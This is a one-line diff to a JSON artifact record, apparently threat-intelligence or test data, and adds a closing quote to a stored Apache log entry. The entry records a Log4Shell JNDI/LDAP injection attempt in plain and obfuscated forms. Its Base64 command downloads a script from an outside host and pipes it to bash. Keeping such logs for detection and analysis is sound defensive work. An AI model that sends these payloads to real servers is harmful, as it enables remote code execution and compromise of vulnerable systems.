@@ -120,7 +120,7 @@
 				"10": {
 					"type": "artifact",
 					"mime_type": "text/plain",
-					"payload_bin": "Mar06 10:05:35 apache.httpserver.test httpd: 192.168.56.101 45.155.202.233 - - [06/Mar/2022:05:58:32 +0000] "GET 192.168.56.101:80/ HTTP/1.1" 200 3424 "${jndi:ldap:/}://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=}" "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIz" "192.168.56.101:80"
+					"payload_bin": "Mar06 10:05:35 apache.httpserver.test httpd: 192.168.56.101 45.155.202.233 - - [06/Mar/2022:05:58:32 +0000] "GET 192.168.56.101:80/ HTTP/1.1" 200 3424 "${jndi:ldap:/}://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=}" "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIz" "192.168.56.101:80""
 				}
 			}
 		}
